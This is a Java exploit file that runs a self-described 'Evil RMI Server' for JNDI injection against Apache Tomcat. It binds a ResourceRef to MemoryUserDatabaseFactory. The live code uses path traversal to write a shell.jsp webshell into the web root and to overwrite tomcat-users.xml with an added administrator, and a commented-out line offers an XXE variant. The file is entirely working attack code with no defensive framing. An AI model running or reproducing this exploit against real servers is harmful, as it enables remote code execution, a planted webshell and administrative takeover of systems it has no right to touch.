package bypass;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class MemoryUserDatabaseBypass {

    public static void main(String[] args) throws Exception {
        System.out.println("[*]Evil RMI Server is Listening on port: 1099");
        Registry registry = LocateRegistry.createRegistry( 1099);

        // xxe
        ResourceRef resourceRef = new ResourceRef("org.apache.catalina.UserDatabase",null,"","",
                true,"org.apache.catalina.users.MemoryUserDatabaseFactory",null );
//        resourceRef.add(new StringRefAddr("pathname", "http://127.0.0.1:8000/xxe.xml"));

        // rce
        resourceRef.add(new StringRefAddr("pathname", "http://127.0.0.1:8000/../../webapps/ROOT/shell.jsp"));
        resourceRef.add(new StringRefAddr("readonly", "false"));

        //tomcat conf 加管理员
        resourceRef.add(new StringRefAddr("pathname", "http://127.0.0.1:8000/../../conf/tomcat-users.xml"));
        resourceRef.add(new StringRefAddr("readonly", "false"));


        LoggingReferenceWrapper referenceWrapper = new LoggingReferenceWrapper(resourceRef);
        registry.bind("Object", referenceWrapper);

    }

    public static class LoggingReferenceWrapper extends ReferenceWrapper {
        public LoggingReferenceWrapper(Reference ref) throws RemoteException, NamingException {
            super(ref);
        }

        @Override
        public Reference getReference() throws RemoteException {
            System.out.println("getReference() 被调用");
            return super.getReference();
        }
    }


}
